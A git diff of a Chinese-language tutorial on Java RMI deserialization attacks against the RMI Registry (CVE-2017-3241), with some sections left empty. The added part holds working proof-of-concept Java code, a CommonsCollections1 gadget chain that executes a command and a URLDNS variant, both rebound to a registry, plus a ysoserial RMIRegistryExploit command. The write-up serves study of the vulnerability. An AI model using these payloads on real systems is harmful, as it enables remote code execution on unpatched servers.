@@ -149,7 +149,7 @@ public class Register {
 
 这里分布式部署Register和Server氛围两种情况，1.两者处于不同服务器和不同JVM；2.两者处于统一服务器的同一JVM
 
-### RMI的远程调用过程
+### RMI的一些关键概念
 
 * 远程方法调用过程中参数的传递和结果的返回：参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现 java.io.Serializable 接口，并且客户端的serialVersionUID字段要与服务器端保持一致。
 * 远程对象和非远程对象：远程对象是实现了 `java.rmi.Remote` 接口的对象，就是Client执行远程方法需要调用的对象；非远程对象是没有实现 `java.rmi.Remote` 接口的对象，在RMI中一般指的是远程方法调用中的参数和返回值。
@@ -165,8 +165,8 @@ public class Register {
   4. Stub连接到Server端监听的通信端口并提交参数；
   5. 远程Server端上执行具体的方法，并返回结果给Stub；
   6. Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样；
-* Regiter和Server的通信：上述的远程调用过程是Client如何调用Server上的方法，但是Client的Stun需要来自Register的一些数据，而Register的Stun则需要来自于Server的一些数据，当Server实现远程接口的类rebind到Register时，它将会向Register发送Stun所必须的数据。
-* **RMI的传输是基于序列化的**
+* Regiter和Server的通信：上述的远程调用过程是Client如何调用Server上的方法，但是Client的Stun来自Register，而Register的Stun则来自于Server，当Server实现远程接口的类rebind到Register时，它将会向Register发送Stun。
+* **RMI的传输是基于序列化的**：不管是传输Stun对象还是非远程对象，都是以序列化的方式传输
 
 ### JRMP
 
@@ -177,8 +177,6 @@ public class Register {
 ## 对RMI的几种攻击
 
 ### 攻击存在危险方法的RMI Server
-
-#### 限制
 
 #### 攻击原理
 
@@ -278,15 +276,7 @@ public class AttackDangerServer {
 
 ### 对于RMI的Register进行反序列化攻击(CVE-2017-3241  Java RMI Registry.bind() Unvalidated Deserialization)
 
-前面说过，RMI的传输是基于序列化的，Client和Register、Client和Server、Server和Register的交互都存在序列化和反序列化的操作，所以在反序列化的过程中就可能会存在反序列化攻击
-
-#### Server攻击Register
-
-#### 限制
-
-* 在jdk8u 之前
-
-#### 攻击原理
+前面说过，RMI的传输是基于序列化的，Client和Register、Client和Server、Server和Register的交互都存在序列化和反序列化的操作，所以在反序列化的过程中就可能会存在反序列化攻击。
 
 当我们将Register和Server部署在不同JVM上时，Server在bind远程对象到Register时，会发送Stun到Register，而这个过程中存在反序列化的操作。
 
@@ -346,7 +336,7 @@ public class CmdServer extends UnicastRemoteObject implements DangeriousFunc1 {
 
 ```
 
-还是之前的例子，但是将server与register分开在不同部署，运行程序，发现server报错
+还是之前的例子，但是将server与register分开在服务器不同部署，运行程序，发现server报错
 
 ![f362282d4d41403879779be216e36fc8](./images/f362282d4d41403879779be216e36fc8.png)
 
@@ -356,19 +346,13 @@ public class CmdServer extends UnicastRemoteObject implements DangeriousFunc1 {
 
 但是在网上查阅了众多资料后，发现Register并不支持非本地ip进行bind、rebind等操作，但是也有一些资料中指出，通过一些配置可以使得register支持远程server绑定，这里暂时搁置，待后续补充。
 
-##### 配置register支持远程server
-
-后续补充
-
-##### 低于jdk8u121版本下的攻击
-
 使用wireshark抓包，查看server bind到Register时发送的报文：
 
 ![image-20240813105804667](./images/image-20240813105804667.png)
 
 ![image-20240813105816758](./images/image-20240813105816758.png)
 
-正如我们之前所说，在server bind到register时，会发送stun所必须的数据到register，发送的过程是基于序列化的，这里也可以看到报文中存在序列化对象，而register也有响应报文，里面也包含了一个序列化对象。我们对register进行攻击的基本原理是，发送恶意的序列化对象到register。
+正如我们之前所说，在server bind到register时，会发送stun所必须的数据到register，发送的过程是基于序列化的，这里也可以看到报文中存在序列化对象，而register也有响应报文，里面也包含了一个序列化对象。
 
 我们这里暂时先不顾不同IP下不能进行bind的问题，先查看一下register对于stun的反序列化过程。通过返回的异常对象，可以查看到register的调用栈，我们这里定位到register的sun.rmi.registry.RegistryImpl_Skel.dispatch。**但是注意这里所使用的jdk版本为8u66，小于8u121。**
 
@@ -487,7 +471,7 @@ public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws E
     }
 ```
 
-这个 `dispatch` 的代码逻辑很简单，用于处理 RMI 调用，执行基于方法编号的操作。从case 0到case 4，可以看到rmi中的bind、list、lookup、rebind和unbind等操作。我们可以看到每个case下的操作逻辑都是类似的，都是先进行了反序列化操作，然后在进行bind、list等操作，结合异常抛出信息，我们发现，异常的抛出是在反序列化之后，所以即使远端server绑定到register会抛出异常，但是并不影响我们的反序列化攻击。
+**这个 `dispatch` 的代码逻辑很简单，用于处理 RMI 调用，执行基于方法编号的操作。从case 0到case 4，对应到rmi中的bind、list、lookup、rebind和unbind等操作。我们可以看到每个case下的操作逻辑都是类似的，除list没有反序列化操作后，都是先进行了反序列化操作，然后在进行RegistryImpl.bind、list等操作，结合异常抛出信息，我们发现，异常的抛出是在反序列化之后，即RegistryImpl.rebind时产生的，所以即使远端server bind、rebind、unbind到register会抛出异常，但是并不影响我们的反序列化攻击。而且，这里我们也可以看到客户端调用lookup也可以在这里触发反序列化操作，所以客户端也可以对Register发起攻击。**
 
 根据之前抓到的报文，可以推测这里序列化的对象大概率就是server发送过来的stun对象，但是我们还是得追溯一下代码确定一下。
 
@@ -541,6 +525,147 @@ public void rebind(String var1, Remote var2) throws AccessException, RemoteExcep
 第二个参数即对应server侧`RemoteCall var3 = super.ref.newCall(this, operations, 3, 4905912898345647071L);`
 
 第三四个参数，则对应server侧，RemoteCall对象中传入的3和4905912898345647071L。
+
+#### <jdk8u121,<JDK7u13,<JDK6u141版本下通过bind、rebind、lookup、unbind对Register的攻击
+
+通过前面的分析可知，只要在bind或者rebind时，绑定一个恶意对象到Register，即可实现对Register的反序列化攻击。而且我们发现在尽显lookup和unbind时，在Register也会触发反序列化，不过它俩相对特殊，因为客户端在进行lookup或者服务端进行unbind到Register时，他们传入的参数为String类型，实现恶意对象的传入需要做一些特别处理。
+
+##### bind和rebind
+
+这里bind和rebind几乎相同，以rebind为例：
+
+使用CC1攻击的poc代码如下
+
+```java
+import org.example.payload.CC1;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Proxy;
+import java.net.MalformedURLException;
+import java.rmi.Naming;
+import java.rmi.Remote;
+import java.rmi.RemoteException;
+
+public class CC1AtackRegister  {
+    public static void main(String[] args) throws RemoteException, MalformedURLException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
+        // CC1.getObject()返回值是CC1的恶意对象
+        InvocationHandler evalObject  = (InvocationHandler) CC1.getObject();
+        // 由于rebind的参数类型的限制，这里需要在恶意对象外包裹一层Remote
+        // 因为CC1的恶意对象实现了接口InvocationHandler，这里可以使用动态代理的方式将其封装
+        // 因为反序列化存在传递性，当proxyEvalObject被反序列化时，evalObject也会被反序列化，自然也会执行poc链
+        Remote proxyEvalObject = (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, evalObject);
+        String host = "rmi://192.168.110.146:1099/";
+        Naming.rebind(host+"CC1", proxyEvalObject);
+    }
+}
+```
+
+```java
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+import java.lang.annotation.Retention;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationTargetException;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC1 {
+    public static Object getObject() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[] { String.class,
+                        Class[].class }, new
+                        Object[] { "getRuntime",
+                        new Class[0] }),
+                new InvokerTransformer("invoke", new Class[] { Object.class,
+                        Object[].class }, new
+                        Object[] { null, new Object[0] }),
+                new InvokerTransformer("exec", new Class[] { String.class },
+                        new String[] {
+                                "calc.exe" }),
+        };
+
+        Transformer transformerChain = new
+                ChainedTransformer(transformers);
+
+        Map innerMap = new HashMap();
+
+        // new
+        innerMap.put("value", "xxxx");
+        // new
+
+        Map outerMap = TransformedMap.decorate(innerMap, null,
+                transformerChain);
+
+        Class clazz =
+                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
+        construct.setAccessible(true);
+        Object obj = construct.newInstance(Retention.class, outerMap);
+        return obj;
+    }
+
+}
+```
+
+从CC1的poc代码可以看出，构建poc代码的一个关键点在于如何将我们的恶意对象包装为实现了Remote接口的类，CC1由于本身的特殊性，最终生成的对象实现了InvocationHandler接口，借助动态代理可以很容易的包装为任意类。其他没有利用AnnotationInvocationHandler的gadget链如何包装了，这里我们可以借鉴ysoserial的做法，它其实也是使用了Annot
+
+ationInvocationHandler将我们生成的恶意对象又包装了一层。以URLDNS为例，poc代码如下:
+
+```java
+import org.example.payload.URLDNS;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.rmi.Naming;
+import java.rmi.Remote;
+import java.util.HashMap;
+import java.util.Map;
+
+public class URLDNSAttackRegister {
+    public static void main(String[] args) throws Exception {
+        String url = "";
+        HashMap obj = (HashMap) new URLDNS().getObject(url);
+
+        Map<String, Object> map = new HashMap<String, Object>();
+        map.put("DNSURL", obj);
+
+        Class clazz =
+                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor construct = clazz.getDeclaredConstructor(Class.class,
+                Map.class);
+        construct.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler)
+                construct.newInstance(Override.class, map);
+        Remote proxyEvalObject = (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, handler);
+        String host = "rmi://192.168.110.146:1099/";
+        Naming.rebind(host+"URLDNS", proxyEvalObject);
+    }
+}
+```
+
+##### lookup和unbind
+
+
+
+##### 使用ysoserial进行攻击
+
+```shell
+java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit 1099 CommonsCollections1 "calc.exe"
+```
+
+ysoserial提供了现成的exp进行攻击，利用了bind方法。使用该工具时，注意目标是否满足gadgat链的java版本要求和依赖要求
+
+#### Server通过bind、rebind攻击Register
+
+#### 攻击原理
+
+##### 低于jdk8u121版本下的攻击
+
+
 
 ###### 常见gadget链的攻击
 
